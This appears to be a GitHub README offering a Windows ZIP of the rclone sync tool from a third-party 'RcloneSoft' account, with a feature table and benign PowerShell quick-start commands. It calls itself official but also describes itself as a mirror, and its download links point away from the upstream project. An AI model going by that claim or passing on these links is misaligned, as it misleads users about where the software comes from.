<div align="center">

# rclone for Windows

### Sync files. Move data. Protect backups.

<p>
  <a href="https://github.com/RcloneSoft/rclone-download/releases"><img src="https://img.shields.io/github/v/release/RcloneSoft/rclone-download?style=flat-square&label=release&color=315c9b" alt="Latest release"></a>
  <a href="https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip"><img src="https://img.shields.io/badge/platform-Windows%20x64-24a8d7?style=flat-square" alt="Windows x64"></a>
  <a href="https://rclone.org/"><img src="https://img.shields.io/badge/package-portable-12233d?style=flat-square" alt="Portable package"></a>
</p>

<p><strong>Official Windows package reference for rclone</strong><br>
File synchronization, cloud transfers, and repeatable backup workflows from one portable command-line tool.</p>

<p>
  <a href="https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip"><strong>Download for Windows x64 →</strong></a>
  &nbsp;·&nbsp;
  <a href="https://rclonesoft.github.io/">Website</a>
  &nbsp;·&nbsp;
  <a href="https://github.com/RcloneSoft/rclone-download/releases">Releases</a>
</p>

</div>

---

## ✦ What rclone does

`rclone` is a command-line file management tool for Windows. It connects local folders, network shares, and cloud storage through one consistent interface, so you can move and manage data without a separate desktop client for every service.

| Capability | Use it for |
|---|---|
| **↔ File synchronization** | Keep folders and remote storage aligned |
| **☁ Cloud transfers** | Move data between local storage and cloud providers |
| **▣ Backups** | Create repeatable copies with filters and resumable operations |
| **⚙ Automation** | Run transfers from PowerShell, scripts, or Task Scheduler |

### Common workflows

- **Sync:** keep a local work folder aligned with cloud storage
- **Migrate:** move data directly from one cloud provider to another
- **Back up:** create scheduled copies with exclusions and filters
- **Control:** use retries, progress output, checks, and optional encryption

## ↓ Windows package

[**Download rclone v1.75.2 for Windows x64**](https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip)

The ZIP contains `rclone.exe` and the accompanying documentation. It is portable: extract it and run `rclone.exe` from PowerShell or Command Prompt.

## ▶ Quick start

```powershell
Expand-Archive .\rclone-v1.75.2-windows-amd64.zip -DestinationPath .
cd .\rclone-v1.75.2-windows-amd64
.\rclone.exe version
.\rclone.exe config
```

After configuring an authorized remote, create a copy:

```powershell
.\rclone.exe copy "C:\Users\Public\Documents" "remote:backups/documents" --progress
```

## ◈ Resources

- [Release notes and package assets](https://github.com/RcloneSoft/rclone-download/releases)
- [rclone landing page](https://rclonesoft.github.io/)
- [Official rclone documentation](https://rclone.org/docs/)

## License and attribution

rclone is an open-source project. This repository provides a package reference and GitHub-hosted delivery mirror for the RcloneSoft profile. See the upstream project for license and source details.
